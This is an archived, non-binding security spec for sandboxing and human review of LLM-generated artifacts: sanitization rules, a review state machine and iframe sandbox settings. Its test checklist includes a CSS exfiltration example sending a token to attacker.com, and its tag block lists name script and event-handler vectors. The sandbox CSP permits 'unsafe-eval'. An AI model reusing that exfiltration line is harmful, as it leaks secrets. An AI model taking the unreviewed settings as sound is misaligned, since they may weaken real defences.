<!--
dex_archive: true
status: submitted-artifact
not_law: true
source: cursor-session-2026-09-08
-->

# Architectural Specification: Agnostic Airlock & PR-Style Ingestion Pipeline for Dynamic LLM Artifacts

> **Archive status.** This is the spec as submitted for review on 2026-09-08.
> It is **not** implementation law. Binding constraints are
> [`AIRLOCK_INGESTION_PROTOCOL.md`](../../../02-protocols/AIRLOCK_INGESTION_PROTOCOL.md)
> (`0x20.00.11`, draft). Findings:
> [`REVIEW.md`](./REVIEW.md). Signature: [`SIGNATURE.md`](./SIGNATURE.md).

---

## 1. Abstract & Threat Model

### 1.1 Scope

Modern large language model (LLM) providers (Gemini, Grok, Perplexity, OpenAI) stream compound transcripts containing heterogeneous payloads: unstructured prose, executable code blocks, schema-bound JSON, reactive SVG/Canvas drawings, and interactive components. Rendering these elements inside a host review application introduces significant vulnerability vectors.

This whitepaper defines an implementation-agnostic specification for a multi-stage Airlock Ingestion Pipeline and Pull-Request (PR) Style Review Engine. The architecture guarantees strict isolation, prevents DOM clobbering and cross-site scripting (XSS), enforces human-in-the-loop review boundaries, and eliminates main-thread rendering degradation.

### 1.2 Threat Model & Failure Modes

The pipeline addresses five core threat categories:

```text
[Untrusted LLM Output] ──► (1) Parser Jamming (ReDoS, Giant Payloads)
                        ──► (2) Execution Escalation (Stored XSS, Event Attributes)
                        ──► (3) Cross-Domain Exfiltration (CSS keyloggers, dynamic fetches)
                        ──► (4) Host State Pollution (DOM Clobbering, Global Scope Leak)
                        ──► (5) Canvas/Media Smuggling (Polyglot files, hidden MIME payloads)
```

**Parser Jamming (Denial of Service):** Pathological regular expressions in markdown or code parsers triggered by adversarial token sequences, causing host browser freezing (ReDoS).

**Execution Escalation:** Inline script injection, malicious SVG event handlers (`onload`, `onerror`), `javascript:` URI pseudo-protocols, and CSS expression execution.

**Cross-Domain Exfiltration:** Embedded tracking pixels, unauthenticated dynamic fetches via unauthorized origins, or CSS-based attribute probing.

**Host State Pollution:** ID/Name collision causing host DOM clobbering or prototype modification.

**Canvas & Media Smuggling:** Executable scripts masquerading as base64-encoded image blobs or polyglot files.

## 2. Architectural Blueprint & Data Flow

The ingest boundary operates as a strict four-layer unidirectional pipeline. No unparsed or unverified payload bypasses a layer.

```text
                    ┌───────────────────────────────┐
                    │ Raw Streaming or Batch Intake    │
                    └──────────────┬───────────────────┘
                                   │
═══════════════════════════════════╪═════════════════════════════════════
LAYER 1: WORKER-THREAD AIRLOCK     │ (Structured Clone / ArrayBuffer)
                                   ▼
                   ┌────────────────────────────────┐
                   │  Lexical AST Decomposer         │
                   │  - Byte & Length Quotas          │
                   │  - Structural Boundaries        │
                   │  - Magic Byte Binary Validator    │
                   └───────────────┬──────────────────┘
═══════════════════════════════════╪═════════════════════════════════════
LAYER 2: SANITIZATION ENGINE       │ (Deterministic Block AST)
                                   ▼
                   ┌────────────────────────────────┐
                   │  Contextual Mutation Scrubber  │
                   │  - HTML/MathML Allowed Tokens   │
                   │  - SVG Strict Whitelisting      │
                   │  - Cryptographic Content Hash     │
                   └───────────────┬──────────────────┘
═══════════════════════════════════╪═════════════════════════════════════
LAYER 3: GOVERNANCE & PR ENGINE    │ (Immutable Block Ledger)
                                   ▼
                   ┌────────────────────────────────┐
                   │  Reviewer State Machine          │
                   │  - Risk Scoring & Triage       │
                   │  - Inline Diffing & Redaction  │
                   │  - Cryptographic Sign-Off      │
                   └───────────────┬──────────────────┘
═══════════════════════════════════╪═════════════════════════════════════
LAYER 4: ISOLATED RUNTIME          │ (Post-Approval Artifact Render)
                                   ▼
                   ┌────────────────────────────────┐
                   │  Double-Sandboxed Null Frame     │
                   │  - Origin: null-origin.domain    │
                   │  - Point-to-Point MessagePort     │
                   │  - Strict Local CSP             │
                   └────────────────────────────────┘
```

## 3. Data Specification: The Canonical Block Envelope

To decouple transport from processing, all ingested content is parsed into an append-only sequence of typed Canonical Blocks.

```typescript
type BlockClassification =
  | "PROSE"              // Markdown, headings, paragraphs
  | "CODE_SNIPPET"       // Static code with language tag
  | "STRUCTURED_DATA"    // Parsed JSON, YAML, or tabular CSV
  | "VECTOR_GRAPHIC"     // Raw SVG or Mermaid definitions
  | "CANVAS_EXPORT"      // Base64 or binary bitmap image states
  | "DYNAMIC_WIDGET";    // Interactive sandboxed mini-apps

type QuarantineStatus = "CLEAN" | "FLAGGED" | "QUARANTINED" | "REDACTED";

interface BlockFingerprint {
  contentSha256: string;      // Digest of raw input
  sanitizedSha256: string;    // Digest of output from Layer 2
  byteSize: number;
}

interface BlockRiskProfile {
  score: number;              // 0 (Benign) to 100 (Critical Risk)
  triggers: string[];         // e.g., ["CONTAINS_UNREGISTERED_SCHEME", "COMPLEX_SVG_DEFS"]
}

interface CanonicalBlock {
  blockId: string;            // Globally unique UUIDv4
  sequenceIndex: number;      // Monotonically increasing sequence ID
  type: BlockClassification;
  rawPayload: string;
  sanitizedPayload: string;
  status: QuarantineStatus;
  risk: BlockRiskProfile;
  fingerprint: BlockFingerprint;
  metadata: Record<string, unknown>;
}
```

## 4. Pipeline Layer Specifications

### Layer 1: The Worker-Thread Airlock (Lexical Decomposition)

**Guarantees**

- Executes in an isolated thread (Web Worker / Node Worker / WASM container) outside the main render context.
- Guarantees execution limits ($T_{\text{max}} = 50\text{ms}$ per token block) to neutralize catastrophic backtracking.
- Rejects arbitrary binary payloads masquerading as valid images via magic number checking.

**Magic Byte Enforcement Matrix**

When encountering base64 canvas exports, data URIs, or binary blobs, Layer 1 validates the absolute file signatures directly:

| Format | Offset (Bytes) | Magic Hex Signature | Mandatory Fallback |
| :--- | :--- | :--- | :--- |
| PNG | 0..7 | `89 50 4E 47 0D 0A 1A 0A` | Drop block to `QUARANTINED` |
| JPEG | 0..2 | `FF D8 FF` | Drop block to `QUARANTINED` |
| WEBP | 0..3 & 8..11 | `52 49 46 46` (RIFF) & `57 45 42 50` (WEBP) | Drop block to `QUARANTINED` |

**Algorithm 1: Lexical Decomposition & Signature Extraction**

```text
Input: Raw string chunk S, MaxPayloadLimit L_max
Output: Array of Incomplete Canonical Blocks B

1.  Assert length(S) <= L_max, else reject with E_PAYLOAD_TOO_LARGE.
2.  Scan S for balanced code fences using deterministic regex index matching:
    Regex: /^```([a-zA-Z0-9_-]+)?\n([\s\S]*?)```$/gm
3.  For each extracted match M:
      a. Determine lang = M.group(1).
      b. If lang in {"json", "geojson", "schema"}:
           Attempt parse JSON(M.group(2)).
           If success: yield STRUCTURED_DATA.
           Else: Mark FLAGGED, reason = "MALFORMED_JSON", yield CODE_SNIPPET.
      c. If lang == "svg" or content starts with "<svg":
           Yield VECTOR_GRAPHIC with risk.score = 50.
      d. Else:
           Yield CODE_SNIPPET.
4.  For remaining substrings not captured by fences:
      Yield PROSE.
5.  Emit Block Stream to Layer 2.
```

### Layer 2: Contextual Mutation Sanitization

**Guarantees**

- Employs an immutable token-whitelisting mechanism. No blacklist-based string filtering.
- Strips all global event handler attributes (`on*`).
- Enforces strict URI scheme safety.

**Permitted Syntax Matrix**

```text
Element Scope      Allowed Tags / Attributes             Banned / Neutralized
─────────────────────────────────────────────────────────────────────────────
PROSE (HTML)       Tags: p, h1-h6, b, i, em, code, pre,  Tags: script, iframe,
                   blockquote, ul, ol, li, table, thead, object, embed, style,
                   tbody, tr, th, td, hr, span.          form, link, meta.
                   Attrs: class (whitelisted), title.    Attrs: style, on*, id.

PROSE (Links)      Tags: a                               Attrs: href containing
                   Attrs: href (http/https/mailto only), javascript:, data:,
                          target="_blank",               or relative paths;
                          rel="noopener noreferrer"     download, ping.

VECTOR_GRAPHIC     Tags: svg, g, path, line, rect,       Tags: script, foreignObject,
(SVG)              circle, ellipse, polygon, text.       animate, set, use.
                   Attrs: viewBox, fill, stroke, d,      Attrs: href, xlink:href,
                          transform, width, height.             on*, id, clip-path.
```

**Sanitization Pass Validation Invariant**

Every block emitted from Layer 2 must calculate and append:

$$\text{sanitizedSha256} = \text{HMAC-SHA256}(\text{sanitizedPayload}, \text{SessionKey})$$

If a block's computed hash fails validation down the line, the review engine terminates its display immediately.

### Layer 3: PR Governance & Review State Machine

The review surface models incoming blocks like lines in a code review system. A block cannot be committed to long-term memory, merged into the database, or rendered in an interactive sandbox without satisfying the state machine rules.

**Finite State Machine (FSM) Transition Diagram**

```text
                 ┌──────────────┐
                 │   INGESTED   │
                 └──────┬───────┘
                        │
                        │ Automated Risk Scan
                        ▼
                 ┌──────────────┐
     ┌───────────┤  IN_REVIEW   ├───────────┐
     │           └──────┬───────┘           │
     │                  │                   │
     │ Risk > 75        │ Manual Edit       │ All Rules Pass
     ▼                  ▼                   ▼
┌──────────────┐ ┌──────────────┐   ┌──────────────┐
│ QUARANTINED  │ │   REDACTED   │   │   APPROVED   │
└──────┬───────┘ └──────┬───────┘   └──────┬───────┘
       │                │                  │
       │ Manual Override│ Approved Diff    │ Merge Triggered
       └───────────────►└─────────────────►▼
                                    ┌──────────────┐
                                    │    MERGED    │
                                    └──────────────┘
```

**State Transition Logic**

- `INGESTED → IN_REVIEW`: Automatically assigned once Layer 1 and Layer 2 successfully hash and categorize the blocks.
- `IN_REVIEW → QUARANTINED`: Triggered automatically if:
  - Risk score exceeds baseline threshold ($\text{Score} \ge 75$).
  - Script-tag attempts, binary mismatch, or malformed data boundaries were intercepted.
- `IN_REVIEW` or `QUARANTINED → REDACTED`: A human operator modifies the block payload (e.g., stripping sensitive API keys or cleaning hostile markdown). The system recalculates $\Delta = \text{Diff}(\text{rawPayload}, \text{redactedPayload})$ and logs the mutation with the operator's cryptographic signature.
- `APPROVED → MERGED`: Block is permanently appended to the chat session's persistent log.

**Reviewer Delta Ledger Contract**

Every mutating action performed by a reviewer generates an immutable event log:

```typescript
interface GovernanceAuditEvent {
  eventId: string;
  blockId: string;
  operatorId: string;
  timestampUtc: number;
  action: "APPROVE_BLOCK" | "QUARANTINE_BLOCK" | "REDACT_CONTENT" | "OVERRIDE_FLAG";
  previousHash: string;
  newHash: string;
  mutationDiff?: {
    added: string[];
    removed: string[];
  };
  signature: string; // Ed25519 signature of the event tuple
}
```

### Layer 4: Isolated Artifact Execution (The Sandboxed Runner)

When a block of type `DYNAMIC_WIDGET` or `VECTOR_GRAPHIC` is approved for live rendering, it must execute outside the top-level application's origin context.

```text
[Reviewer Interface (https://core.app.domain)]
       │
       │ 1. Mounts unprivileged iframe
       │
       ▼
[<iframe src="https://sandbox.isolated.domain/runner">]
       │
       │ 2. Creates point-to-point MessageChannel
       ├─────────────────────────────────────────────┐
       │                                             │
       ▼ (Port 1: Transferred)                       ▼ (Port 2: Retained)
[Worker Execution Context]              [Host Governance Broker]
  - Origin: null (or isolated domain)     - Origin: https://core.app.domain
  - CSP: script-src 'self' 'unsafe-eval'   - Validates event signatures
  - Memory Quota: 64MB hard limit         - Triggers UI state updates
```

**Sandbox Attributes & Headers**

The execution wrapper enforces the following configurations:

Iframe attributes:

```html
<iframe
  sandbox="allow-scripts"
  src="https://sandbox.isolated.domain/runner.html"
  csp="default-src 'none'; script-src 'self' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src data: blob:;"
  referrerpolicy="no-referrer"
  loading="lazy"
></iframe>
```

HTTP headers (delivered by `sandbox.isolated.domain`):

```http
Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src data: blob:;
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
```

## 5. Implementation-Agnostic Interface Reference

Systems implementing this architecture should satisfy the following core interface contracts.

### 5.1 Pipeline Controller Contract

```typescript
interface IAirlockPipeline {
  /**
   * Ingests a raw transcript stream or completed payload string.
   * Runs Layer 1 and Layer 2 within the decoupled worker context.
   */
  ingest(rawStream: ReadableStream<Uint8Array> | string): Promise<CanonicalBlock[]>;

  /**
   * Evaluates the readiness of a transcript batch for merging.
   * Returns validation errors and an overall approval status.
   */
  auditBatch(blocks: CanonicalBlock[]): {
    canMerge: boolean;
    unresolvedBlockIds: string[];
    aggregateRiskScore: number;
  };
}
```

### 5.2 Governance Controller Contract

```typescript
interface IGovernanceController {
  /**
   * Mutates a block via reviewer action, logging a signed audit entry.
   */
  redactBlock(
    blockId: string,
    newContent: string,
    reviewerSignature: string
  ): Promise<CanonicalBlock>;

  /**
   * Overrides an automated quarantine flag.
   */
  overrideQuarantine(
    blockId: string,
    justification: string,
    reviewerSignature: string
  ): Promise<CanonicalBlock>;

  /**
   * Seals and commits all APPROVED or REDACTED blocks to persistent storage.
   */
  commitTransaction(sessionId: string): Promise<{ transactionHash: string }>;
}
```

## 6. Verification Checklist & Compliance Gates

Before deploying this architecture, verify that the following failure paths have dedicated test coverage:

- [ ] **ReDoS Immunity:** Feeds arbitrary repetition patterns (e.g. `((a+)+)+$` equivalents inside backticks) without stalling the worker thread past 50ms.
- [ ] **Polyglot File Denial:** Appends executable bash scripts to a valid PNG binary structure; verifies that Layer 1 catches the anomaly or isolates the payload strictly to an immutable base64 preview.
- [ ] **Frame Hijacking Defense:** Attempts to execute `parent.location.href = '...'` from within the sandboxed runner; verifies that the action is blocked with a `DOMException` error.
- [ ] **CSS Variable Probing:** Embeds dynamic CSS variables pointing to external endpoints (`background: url('//attacker.com/leak=' + var(--token))`); verifies that CSS containment and CSP prevent the network egress.
- [ ] **Deterministic Hashing:** Confirms that altering a single whitespace character in a code block invalidates the `contentSha256` signature and trips the approval block.

## 7. Standards & Specifications

- W3C Content Security Policy Level 3: <https://www.w3.org/TR/CSP3>
- HTML Standard (Sandboxed Browsing Contexts): <https://html.spec.whatwg.org/multipage/browsers.html>
- RFC 4648 (Base-N Data Encodings): <https://datatracker.ietf.org/doc/html/rfc4648>
- RFC 6234 (US Secure Hash Algorithms - SHA & HMAC-SHA): <https://datatracker.ietf.org/doc/html/rfc6234>
- W3C Cross-Origin Resource Policy (CORP) & Embedder Policy (COEP): <https://www.w3.org/TR/post-spectre-webdev>
